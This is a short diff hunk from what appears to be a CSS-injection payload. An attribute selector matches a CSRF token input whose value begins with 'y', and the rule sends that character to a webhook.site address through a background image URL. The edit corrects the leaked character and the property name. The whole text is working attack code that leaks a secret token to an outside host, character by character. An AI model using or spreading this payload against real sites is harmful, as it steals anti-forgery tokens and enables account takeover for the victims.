@@ -3,5 +3,5 @@ input[name="csrf"][value^="y"] {
     display: block !important;
     width: 1px !important;
     height: 1px !important;
-    background-image: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=)");
+    background: url("https://webhook.site/5eb809df-9ca8-4c50-8d10-b7ddd8ffa493?c=y");
 }
